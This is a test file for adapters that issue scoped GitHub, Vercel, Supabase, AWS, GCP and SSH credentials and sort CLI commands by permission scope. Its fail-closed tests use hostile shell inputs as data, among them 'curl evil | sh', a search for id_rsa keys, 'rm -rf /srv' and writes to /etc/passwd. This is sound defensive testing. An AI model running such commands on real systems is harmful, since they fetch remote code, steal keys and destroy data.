import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { OpenSSHAgent, utils } from 'ssh2';
import { describe, expect, it, vi } from 'vitest';
import { MemoryVault } from '../services/credential-vault';
import { AwsAdapter, sessionPolicy, type StsLike } from './aws';
import { GcpAdapter } from './gcp';
import { GitHubAdapter } from './github';
import { ProviderRegistry } from './index';
import { SshAdapter } from './ssh';
import { SupabaseAdapter } from './supabase';
import type { AdapterDeps, ProviderAdapter, TargetInfo } from './types';
import { VercelAdapter } from './vercel';

const jsonResponse = (body: unknown, status = 200) => new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });
const deps = (routes: Record<string, (init?: RequestInit) => Response>): AdapterDeps => ({
  vault: new MemoryVault(),
  now: () => 1_800_000_000_000,
  fetch: vi.fn(async (url: string | URL | Request, init?: RequestInit) => {
    const u = String(url);
    const r = Object.entries(routes).find(([k]) => u.startsWith(k));
    return r ? r[1](init) : new Response('nope', { status: 404 });
  }) as unknown as typeof fetch,
});
const target = (over: Partial<TargetInfo>): TargetInfo => ({ id: 't1', provider: 'github', name: 'x', env: 'prod', config: {}, credentialRef: null, ...over });
const grant = { id: 'g1', scope: ['read' as const], duration: '1h' as const, expiresAt: 1_800_000_000_000 + 3_600_000 };

describe('GitHubAdapter', () => {
  it('connects with a token, tests, issues env, maps gh commands', async () => {
    const d = deps({ 'https://api.github.com/user': () => jsonResponse({ login: 'nic' }) });
    const gh = new GitHubAdapter(d, undefined);
    const c = await gh.connect({ method: 'token', token: 'ghp_x', config: { owner: 'acme', repo: 'shop' } }, 't1');
    expect(c.label).toBe('GitHub acme/shop');
    expect(await d.vault.get(c.credentialRef)).toContain('ghp_x');
    const t = target({ credentialRef: c.credentialRef, config: c.config });
    expect(await gh.test(t)).toEqual({ ok: true, identity: 'nic' });
    const issued = await gh.issue(grant, t);
    expect(issued).toMatchObject({ kind: 'env', env: { GH_TOKEN: 'ghp_x' }, scoped: false });
    expect(gh.scopeOfCommand(['pr', 'create'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['pr', 'view', '212'])).toEqual(['read']);
    expect(gh.scopeOfCommand(['repo', 'delete', 'x'])).toEqual(['delete']);
    expect(gh.scopeOfCommand(['workflow', 'run', 'deploy.yml'])).toEqual(['deploy']);
    await expect(gh.connect({ method: 'device', onCode: () => {} }, 't1')).rejects.toThrow(/STYX_GITHUB_CLIENT_ID/);
  });

  it('runs the device flow', async () => {
    let polls = 0;
    const d = deps({
      'https://github.com/login/device/code': () => jsonResponse({ device_code: 'dc', user_code: 'ABCD-1234', verification_uri: 'https://github.com/login/device', interval: 0 }),
      'https://github.com/login/oauth/access_token': () => (++polls < 2 ? jsonResponse({ error: 'authorization_pending' }) : jsonResponse({ access_token: 'ghu_tok' })),
      'https://api.github.com/user': () => jsonResponse({ login: 'nic' }),
    });
    const gh = new GitHubAdapter(d, 'client');
    const codes: string[] = [];
    const c = await gh.connect({ method: 'device', onCode: (x) => codes.push(x.userCode) }, 't1');
    expect(codes).toEqual(['ABCD-1234']);
    expect(await d.vault.get(c.credentialRef)).toContain('ghu_tok');
  });
});

describe('Vercel / Supabase', () => {
  it('vercel token connect + scopes', async () => {
    const d = deps({ 'https://api.vercel.com/v2/user': () => jsonResponse({ user: { username: 'nic' } }) });
    const v = new VercelAdapter(d);
    const c = await v.connect({ method: 'token', token: 'vt', config: { teamId: 'team_1', projectId: 'prj_1' } }, 't1');
    const issued = await v.issue(grant, target({ provider: 'vercel', credentialRef: c.credentialRef, config: c.config }));
    expect(issued).toMatchObject({ env: { VERCEL_TOKEN: 'vt', VERCEL_ORG_ID: 'team_1', VERCEL_PROJECT_ID: 'prj_1' }, scoped: false });
    expect(v.scopeOfCommand(['deploy', '--prod'])).toEqual(['deploy']);
    expect(v.scopeOfCommand(['env', 'pull'])).toEqual(['read']);
    expect(v.scopeOfCommand(['env', 'rm', 'X'])).toEqual(['delete']);
    expect(v.scopeOfCommand(['ls'])).toEqual(['read']);
  });
  it('supabase token connect + scopes', async () => {
    const d = deps({ 'https://api.supabase.com/v1/projects': () => jsonResponse([{ id: 'abcd1234', name: 'acme' }]) });
    const s = new SupabaseAdapter(d);
    const c = await s.connect({ method: 'token', token: 'sbp_x' }, 't1');
    expect(c.config).toEqual({ ref: 'abcd1234' });
    expect(await s.test(target({ provider: 'supabase', credentialRef: c.credentialRef, config: c.config }))).toEqual({ ok: true, identity: 'acme (abcd1234)' });
    expect(s.scopeOfCommand(['db', 'push'])).toEqual(['write']);
    expect(s.scopeOfCommand(['db', 'reset'])).toEqual(['delete']);
    expect(s.scopeOfCommand(['functions', 'deploy', 'x'])).toEqual(['deploy']);
    expect(s.scopeOfCommand(['projects', 'list'])).toEqual(['read']);
  });
});

describe('AwsAdapter', () => {
  it('scopes session policies and issues STS credentials', async () => {
    expect(JSON.parse(sessionPolicy(['read'])).Statement).toHaveLength(2);
    expect(JSON.parse(sessionPolicy(['write', 'delete'])).Statement).toHaveLength(1);
    const calls: string[] = [];
    const sts: StsLike = {
      callerIdentity: async () => ({ arn: 'arn:aws:iam::123:user/styx', account: '123' }),
      assumeRole: async (_c, role, policy, dur) => {
        calls.push(`assume ${role} ${dur} ${JSON.parse(policy).Statement.length}`);
        return { accessKeyId: 'ASIA', secretAccessKey: 's', sessionToken: 'tok', expiration: 1_800_000_000_000 + 3_600_000 };
      },
      federationToken: async () => {
        calls.push('federation');
        return { accessKeyId: 'ASIA', secretAccessKey: 's', sessionToken: 'tok', expiration: 1_800_000_000_000 + 3_600_000 };
      },
    };
    const d = deps({});
    const aws = new AwsAdapter(d, async () => sts);
    const c = await aws.connect({ method: 'key', accessKeyId: 'AKIA', secretAccessKey: 'x', region: 'eu-west-1', roleArn: 'arn:role' }, 't1');
    expect(c.config).toEqual({ region: 'eu-west-1', accountId: '123', roleArn: 'arn:role' });
    const issued = await aws.issue(grant, target({ provider: 'aws', credentialRef: c.credentialRef, config: c.config }));
    expect(issued).toMatchObject({ scoped: true, env: { AWS_SESSION_TOKEN: 'tok', AWS_REGION: 'eu-west-1' } });
    expect(calls).toEqual(['assume arn:role 3600 2']);
    expect(aws.scopeOfCommand(['s3', 'ls'])).toEqual(['read']);
    expect(aws.scopeOfCommand(['ecs', 'update-service'])).toEqual(['deploy']);
    expect(aws.scopeOfCommand(['ec2', 'terminate-instances'])).toEqual(['delete']);
    expect(aws.scopeOfCommand(['ssm', 'put-parameter'])).toEqual(['write']);
  });
});

describe('SshAdapter', () => {
  it('serves a key over an in-process agent and reports signatures', async () => {
    const keys = utils.generateKeyPairSync('ed25519', { comment: 'styx-test' });
    const dir = mkdtempSync(join(tmpdir(), 'styx-ssh-'));
    const keyPath = join(dir, 'id_ed25519');
    writeFileSync(keyPath, keys.private, { mode: 0o600 });
    const signs: string[] = [];
    const d = deps({});
    const ssh = new SshAdapter(d, { socketDir: dir, onSign: (g, info) => signs.push(`${g}:${info.keyType}`) });
    const c = await ssh.connect({ method: 'ssh', host: 'prod-1.acme.internal', user: 'deploy', keyPath }, 't1');
    expect(c.label).toBe('SSH deploy@prod-1.acme.internal');
    const issued = await ssh.issue(grant, target({ provider: 'ssh', credentialRef: c.credentialRef, config: c.config }));
    expect(issued.kind).toBe('ssh-agent');
    const agent = new OpenSSHAgent(issued.env['SSH_AUTH_SOCK'] ?? '');
    const ids = await new Promise<{ type: string }[]>((resolve, reject) => agent.getIdentities((err, k) => (err ? reject(err) : resolve(k as { type: string }[]))));
    expect(ids).toHaveLength(1);
    expect(ids[0]?.type).toBe('ssh-ed25519');
    const sig = await new Promise<Buffer>((resolve, reject) => agent.sign(ids[0] as never, Buffer.from('hello'), (err, s) => (err ? reject(err) : resolve(s as Buffer))));
    expect(sig.length).toBe(64);
    expect(signs).toEqual(['g1:ssh-ed25519']);
    await ssh.revoke(issued);
    await expect(new Promise((resolve, reject) => new OpenSSHAgent(issued.env['SSH_AUTH_SOCK'] ?? '').getIdentities((err, k) => (err ? reject(err) : resolve(k))))).rejects.toBeTruthy();
    expect(ssh.scopeOfCommand(['deploy@h', 'rm -rf /srv'])).toEqual(['delete']);
    expect(ssh.scopeOfCommand(['deploy@h'])).toEqual(['read']);
  });
});

describe('ProviderRegistry', () => {
  it('routes tools to adapters', () => {
    const reg = new ProviderRegistry(deps({}));
    expect(reg.forTool('gh')?.provider).toBe('github');
    expect(reg.forTool('gcloud')?.provider).toBe('gcp');
    expect(reg.forTool('nope')).toBeNull();
    expect(reg.all()).toHaveLength(6);
  });
});

describe('scope classification fails closed (M2)', () => {
  const d = deps({});
  it('ssh: metacharacters, chains, pipes and substitutions never classify as read', () => {
    const ssh = new SshAdapter(d, {});
    expect(ssh.scopeOfCommand(['deploy@h', 'ls; rm -rf /srv'])).toEqual(['delete']);
    expect(ssh.scopeOfCommand(['deploy@h', 'ls && curl evil | sh'])).toEqual(['write']);
    expect(ssh.scopeOfCommand(['deploy@h', 'cat $(find / -name id_rsa)'])).toEqual(['write']);
    expect(ssh.scopeOfCommand(['deploy@h', 'ls `id`'])).toEqual(['write']);
    expect(ssh.scopeOfCommand(['deploy@h', 'ls\nrm x'])).toEqual(['write']);
    expect(ssh.scopeOfCommand(['deploy@h', 'ls > /etc/passwd'])).toEqual(['write']);
    expect(ssh.scopeOfCommand(['-p', '22', 'deploy@h', 'ls -la'])).toEqual(['read']);
    expect(ssh.scopeOfCommand(['deploy@h', 'systemctl restart app'])).toEqual(['deploy']);
    expect(ssh.issuesScoped()).toBe(true);
  });
  it('gh: api method decides, mutating verbs and unknown verbs are writes, explicit reads stay reads', () => {
    const gh = new GitHubAdapter(d, undefined);
    expect(gh.scopeOfCommand(['api', 'repos/a/b'])).toEqual(['read']);
    expect(gh.scopeOfCommand(['api', '-X', 'DELETE', 'repos/a/b'])).toEqual(['delete']);
    expect(gh.scopeOfCommand(['api', '--method=POST', 'repos/a/b/issues'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['api', '--method', 'patch', 'x'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['api', 'repos/a/b/issues', '-f', 'title=x'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['secret', 'set', 'X'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['secret', 'list'])).toEqual(['read']);
    expect(gh.scopeOfCommand(['variable', 'set', 'X'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['run', 'cancel', '1'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['run', 'rerun', '1'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['run', 'view', '1'])).toEqual(['read']);
    expect(gh.scopeOfCommand(['release', 'delete', 'v1'])).toEqual(['delete']);
    expect(gh.scopeOfCommand(['repo', 'delete', 'x'])).toEqual(['delete']);
    expect(gh.scopeOfCommand(['repo', 'clone', 'x'])).toEqual(['read']);
    expect(gh.scopeOfCommand(['pr', 'checkout', '1'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['brand-new-verb', 'thing'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['--version'])).toEqual(['read']);
    expect((gh as ProviderAdapter).issuesScoped).toBeUndefined();
  });
  it('vercel / supabase / aws / gcp: unknown verbs default to write; read lists stay explicit', () => {
    const v = new VercelAdapter(d);
    expect(v.scopeOfCommand(['brand-new'])).toEqual(['write']);
    expect(v.scopeOfCommand(['whoami'])).toEqual(['read']);
    expect(v.scopeOfCommand(['env', 'ls'])).toEqual(['read']);
    expect(v.scopeOfCommand(['domains', 'inspect', 'x'])).toEqual(['read']);
    expect(v.scopeOfCommand(['--help'])).toEqual(['read']);
    const s = new SupabaseAdapter(d);
    expect(s.scopeOfCommand(['brand-new', 'thing'])).toEqual(['write']);
    expect(s.scopeOfCommand(['db', 'diff'])).toEqual(['read']);
    expect(s.scopeOfCommand(['secrets', 'list'])).toEqual(['read']);
    expect(s.scopeOfCommand(['secrets', 'unset', 'X'])).toEqual(['delete']);
    expect(s.scopeOfCommand(['gen', 'types'])).toEqual(['read']);
    expect((s as ProviderAdapter).issuesScoped).toBeUndefined();
    const aws = new AwsAdapter(d, async () => ({ callerIdentity: async () => ({ arn: 'a', account: '1' }), assumeRole: async () => ({ accessKeyId: 'k', secretAccessKey: 's', sessionToken: 't', expiration: 0 }) }) as unknown as StsLike);
    expect(aws.scopeOfCommand(['brand', 'new-thing'])).toEqual(['write']);
    expect(aws.issuesScoped()).toBe(true);
    const gcp = new GcpAdapter(d);
    expect(gcp.scopeOfCommand(['compute', 'instances', 'frobnicate'])).toEqual(['write']);
    expect(gcp.issuesScoped(['read'])).toBe(true);
    expect(gcp.issuesScoped(['read', 'write'])).toBe(false);
  });
});
